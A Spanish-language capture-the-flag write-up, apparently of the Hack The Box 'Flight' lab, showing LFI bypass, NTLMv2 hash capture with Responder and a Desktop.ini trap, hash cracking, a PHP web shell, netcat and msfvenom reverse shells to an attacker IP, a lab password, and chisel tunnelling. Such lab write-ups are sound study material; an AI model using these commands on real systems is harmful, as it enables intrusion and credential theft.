<p>usando <code>dirsearh</code> encontramos un <code>index.php</code> el cual esta haciendo referencia a una variable <code>$DATA</code> esto nos da una pista así que vamos a intentar un <code>LFI</code></p>
<img src="/src/assets/images/Img/20240810122957.png"/>
<p><code>LFI</code>
al realizar un <code>LFI</code> nos reporta que esta actividad es sospechosa y que por ende a sido bloqueada. esto es una buena señal ya que si podemos identificar como se esta realizando este bloqueo podemos intentar bypasearlo</p>
<img src="/src/assets/images/Img/20240810123158.png"/>
<p><code>LFI</code>
probamos con las rutas absolutas y funciono. parece que esta bloqueando el parámetro <code>../</code></p>
<img src="/src/assets/images/Img/20240810123844.png"/>
<h2 id="fuzzing-con-wfuzz-1">Fuzzing con wfuzz</h2>
<p>con estos parámetros vamos a realizar un fuzzing con una lista de palabras especificas para Windows.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">❯ wfuzz </span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">f </span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">fuzz</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">output</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">csv</span><span style="color:#999999;--shiki-dark:#89DDFF">,</span><span style="color:#393A34;--shiki-dark:#BABED8">csv </span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">c </span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">w file_inclusion_windows</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">txt</span><span style="color:#B31D28;--shiki-dark:#BABED8;font-style:italic;--shiki-dark-font-style:inherit"> --</span><span style="color:#393A34;--shiki-dark:#BABED8">hw </span><span style="color:#2F798A;--shiki-dark:#F78C6C">89</span><span style="color:#999999;--shiki-dark:#89DDFF">,</span><span style="color:#2F798A;--shiki-dark:#F78C6C">95</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">http://school.flight.htb/index.php?view=FUZZ</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span></code></pre> 
<img src="/src/assets/images/Img/20240810124631.png"/>
<h2 id="responder">responder</h2>
<p>vamos a iniciar el responder para posteriormente hacer una petición e intentar envenenar el trafico y poder capturar un <code>hash NTLMv2</code></p>
<img src="/src/assets/images/Img/20240810125124.png"/>
<p><code>hash NTLMv2</code>
ahora solo vamos a forzar la autenticación contra los recursos compartidos de nuestra maquina atacante navegando a esta dirección <code>http://school.flight.htb/index.php?view=//10.10.14.8/share</code> de esta manera la maquina se autentica contra nosotros y podemos capturar el <code>hash NTLMv2</code></p>
<img src="/src/assets/images/Img/20240810125817.png"/>
<h2 id="hashcat">hashcat</h2>
<img src="/src/assets/images/Img/20240810130537.png"/>
<p><code>PASS</code>
después de esperar un rato vemos que hashcat ha podido identificar la contraseña del usuario <code>svc_apache</code></p>
<img src="/src/assets/images/Img/20240810131709.png"/>
<h2 id="validación-de-credenciales">Validación de credenciales</h2>
<p>podemos validar las credenciales que hemos conseguido y parecen ser validas para enumerar los recursos smb pero no podemos conectarnos por <code>evil-winrm</code> esto es normal ya que las cuentas de servicios como en este caso no cuentan con esta opción</p>
<img src="/src/assets/images/Img/20240810132329.png"/>
<h2 id="crackmapexec">crackmapexec</h2>
<p>hacemos una enumeración para obtener usuarios potenciales del sistema.</p>
<img src="/src/assets/images/Img/20240810132635.png"/>
<h2 id="crackmapexec-1">crackmapexec</h2>
<p>hacemos una validación con la contraseña y la lista de usuarios que hemos conseguido y obtenemos una coincidencia para el usuario <code>S.Moon</code></p>
<img src="/src/assets/images/Img/20240810133411.png"/>
<h2 id="crackmapexec-2">crackmapexec</h2>
<p>con este usuario tenemos permisos de lectura y de escritura en el recurso <code>Shared</code> lo cual nos permite realizar un nuevo ataque e intentar capturar otro <code>hash NTLMv2</code></p>
<img src="/src/assets/images/Img/20240810134450.png"/>
<h2 id="responder-1">Responder</h2>
<p>en este caso ya que tenemos permisos de escritura en este recurso podemos vamos a crear un archivo que intente llamar el recurso en nuestra maquina para ver si algún otro usuario intenta acceder a este recurso y así poder obtener un segundo hash <code>NTMLv2</code></p>
<p>primero vamos a crear el archivo <code>Desktop.ini</code></p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#393A34;--shiki-dark:#BABED8">Shell</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">Command</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#2F798A;--shiki-dark:#F78C6C">2</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">IconFile</span><span style="color:#999999;--shiki-dark:#89DDFF">=\</span><span style="color:#B31D28;--shiki-dark:#BABED8;font-style:italic;--shiki-dark-font-style:inherit">\10.10.14.8\share\hello.ico</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#393A34;--shiki-dark:#BABED8">Taskbar</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">Command</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#393A34;--shiki-dark:#BABED8">ToggleDesktop</span></span></code></pre> 
<p>ahora vamos a estar a la escucha con el responder y vamos a subir el archivo <code>Desktop.ini</code> a los recursos compartidos y esperamos que algún usuario intente conectarse</p>
<img src="/src/assets/images/Img/20240810140010.png"/>
<h2 id="crackmapexec-3">crackmapexec</h2>
<p>aplicamos los mismos pasos con la herramienta <code>hashcat</code> para descifrar el nuevo hash <code>NTLMv2</code> y de esta manera obtener las credenciales del usuario c.bum. en este momento con el usuario c.bum podemos leer y escribir en el recurso compartido <code>Web</code> por lo que nos vamos a aprovechar de esto.</p>
<img src="/src/assets/images/Img/20240810140848.png"/>
<h2 id="smbclient">smbclient</h2>
<p>una ves dentro de los recursos compartidos de <code>c.bum</code> podemos navegar hasta el directorio <code>Web</code> y dentro tenemos el directorio <code>school.flig.htb</code> en el cual podemos ver los diferentes archivos.</p>
<img src="/src/assets/images/Img/20240810141543.png"/>
<h2 id="reverse-shell">Reverse shell</h2>
<p>en este punto vamos a crear una reverse shell usando <code>msfvenom</code> para subirla a este recurso compartido y luego llamarla desde la web para poder obtener una conexión</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">msfvenom </span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">p php</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">reverse_php </span><span style="color:#A65E2B;--shiki-dark:#BABED8">LHOST</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#2F798A;--shiki-dark:#F78C6C">10.10</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">14</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">8</span><span style="color:#A65E2B;--shiki-dark:#BABED8"> LPORT</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#2F798A;--shiki-dark:#F78C6C">9001</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> -</span><span style="color:#393A34;--shiki-dark:#BABED8">f raw </span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span><span style="color:#393A34;--shiki-dark:#BABED8"> rawr</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">php</span></span></code></pre> 
<p>después de crear la reverse shell la subimos al recurso compartido y ya solo debemos llamarlo desde la web o incluso haciendo un curl a la dirección <code>http://school.flight.htb/rawr.php</code></p>
<p>#Nota debido a que esta shell no es totalmente interactiva y se pierde la conexión nada cierto tiempo vamos a realizar otro enfoque</p>
<img src="/src/assets/images/Img/20240810142207.png"/>
<h2 id="shell">shell</h2>
<p>primero que nada vamos a crear un archivo PHP que nos permita tener ejecución de comandos a través de CMD</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">&lt;</span><span style="color:#B31D28;--shiki-dark:#BABED8;font-style:italic;--shiki-dark-font-style:inherit">?</span><span style="color:#393A34;--shiki-dark:#BABED8">php</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#82AAFF">	system</span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#B31D28;--shiki-dark:#82AAFF;font-style:italic;--shiki-dark-font-style:inherit">$</span><span style="color:#A65E2B;--shiki-dark:#82AAFF">_GET</span><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">cmd</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#999999;--shiki-dark:#89DDFF">])</span><span style="color:#B31D28;--shiki-dark:#BABED8;font-style:italic;--shiki-dark-font-style:inherit">;</span></span>
<span class="line"><span style="color:#B31D28;--shiki-dark:#BABED8;font-style:italic;--shiki-dark-font-style:inherit">?</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span></span></code></pre> 
<p>luego vamos a cargar este archivo al recurso compartido de la misma manera que hicimos antes. esto nos permite ejecutar comandos a través de la URL.</p>
<img src="/src/assets/images/Img/20240810144420.png"/>
<p>ahora vamos a localizar el binario de netcat para poder subirlo a la maquina</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">❯ locate netcat</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">exe</span></span>
<span class="line"></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">home</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">gleoq</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">Desktop</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">Hack</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">The</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">Box</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">Advanced</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">Labs</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">Context</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">netcat</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">exe</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # esta es la ruta del archivo</span></span>
<span class="line"></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">❯ cp </span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">home</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">gleoq</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">Desktop</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">Hack</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">The</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">Box</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">Advanced</span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">Labs</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">Context</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">netcat</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">exe</span><span style="color:#999999;--shiki-dark:#89DDFF"> .</span></span>
<span class="line"></span></code></pre> 
<p>ahora que ya tenemos el binario en nuestra ubicación de trabajo vamos a subirlo al recurso compartido de la misma manera que hemos hecho con los otros archivos.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">put shell</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">put netcat</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">exe</span></span></code></pre> 
<p>ahora solo debemos cargar los dos archivos y luego podemos ejecutarlo desde la web con el siguiente comando
<code>http://school.flight.htb/shell.php?cmd=netcat.exe -e powershell.exe 10.10.14.8 9001</code></p>
<img src="/src/assets/images/Img/20240810145130.png"/>
<h2 id="escalada-de-privilegios">Escalada De privilegios</h2>
<p>una ves dentro de la maquina podemos ver el directorio <code>inetpub</code> La carpeta Inetpub, hace referencia a los servicios que permiten hacer configuraciones de tipo servidor en el sistema. lo cual me hace pensar que esta corriendo algún servicio tipo web internamente en la maquina</p>
<img src="/src/assets/images/Img/20240810150156.png"/>
<p><code>8000</code>
también podemos ver el puerto 8000 que esta en escucha lo cual me parece raro ya que este puerto no estaba en mi escaneo de <code>nmap</code></p>
<p>Dado que el firewall cierra el puerto 8000, no podemos acceder a este sitio externamente. Necesitaremos reenviar el puerto 8000 a nuestra máquina local a través de un túnel inverso.</p>
<img src="/src/assets/images/Img/20240810150605.png"/>
<h2 id="user-pivoting">User Pivoting</h2>
<p>primero que nada vamos a cambiarnos de usuario ya que actualmente somos el usuario <code>svc_apache</code> pero recordemos que tenemos las credenciales del usuario <code>c.bum</code> para ello lo primero que debemos hacer es descargar el binario <code>Runas.exe</code> y subirlo a la maquina. una vez ua tengamos este binario solo debemos ejecutarlo usando el siguiente comando:</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">.\</span><span style="color:#B31D28;--shiki-dark:#BABED8;font-style:italic;--shiki-dark-font-style:inherit">runas.exe c.bum Tikkycoll_431012284 powershell.exe -r 10.10.14.8:9009</span></span></code></pre> 
<p>de esta manera obtenemos una shell como el usuario <code>c.bum</code></p>
<img src="/src/assets/images/Img/20240810152657.png"/>
<h2 id="port-forwarding">Port Forwarding</h2>
<p>ahora que somos el usuario c.bum solo debemos realizar un <code>PortForwarding</code> para poder tener acceso al puerto 8000 que esta de manera interna en la maquina. para ello primero vamos a realizar un túnel inverso con chisel</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">❯ </span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#AB5959;--shiki-dark:#89DDFF">/</span><span style="color:#393A34;--shiki-dark:#BABED8">chisel server </span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">p </span><span style="color:#2F798A;--shiki-dark:#F78C6C">9005</span><span style="color:#B31D28;--shiki-dark:#BABED8;font-style:italic;--shiki-dark-font-style:inherit"> --</span><span style="color:#393A34;--shiki-dark:#BABED8">reverse</span></span></code></pre> 
<img src="/src/assets/images/Img/20240810173920.png"/>
<p><code>Tunneling</code>
luego en la maquina victima debemos ejecutar el siguiente comando para enviar la conexión del puerto 8000 a nuestra maquina. esta conexión viajara por el túnel que hemos creado</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A65E2B;--shiki-dark:#BABED8">PS</span><span style="color:#393A34;--shiki-dark:#BABED8"> C</span><span style="color:#999999;--shiki-dark:#89DDFF">:\</span><span style="color:#B31D28;--shiki-dark:#BABED8;font-style:italic;--shiki-dark-font-style:inherit">tmp&gt; .\chisel.exe client 10.10.14.8:9005 R:8000:127.0.0.1:8000</span></span></code></pre> 
<img src="/src/assets/images/Img/20240810174105.png"/>
<h2 id="enumeración-del-puerto-8000-portforwarding">Enumeración del puerto 8000 (PortForwarding)</h2>
<p>en la web no vemos nada interesante sin embargo podemos investigar el directorio donde se esta ejecutando</p>
<img src="/src/assets/images/Img/20240810174306.png"/>
<p><code>PortForwarding</code>
ahora que ya tenemos la conexión y podemos ver la web en nuestra maquina local podemos hacer varias pruebas. lo primero que se me ocurre es crear un archivo HTML que nos permita establecer una reverse shell desde esta web para saber si se esta recibiendo como <code>administrator</code></p>
<img src="/src/assets/images/Img/20240810175305.png"/>
<p><code>shell.aspx</code>
en este pinto he utilizado una reverse shell con formato aspx <a href="https://github.com/borjmz/aspx-reverse-shell">shell.aspx</a> y luego simplemente la hemos ejecutado desde el navegador llamando la ruta <code>http://127.0.0.1:8000/shell.aspx</code> y efectivamente obtenemos otro usuario pero no es el usuario administrador</p>
<img src="/src/assets/images/Img/20240810180057.png"/>
<p><code>whoami /all</code>
enumerando este usuario podemos ver que cuenta con el permiso de <code>SeImpersonatePrivilege - Impersonate a client after authentication Enabled</code></p>
<img src="/src/assets/images/Img/20240810180639.png"/>
<p><code>Rubeus</code>
Ahora que tenemos un ticket válido para la cuenta de la máquina, necesitamos convertirlo del formato base64 - kirbi a ccache para usarlo con impacket.</p>
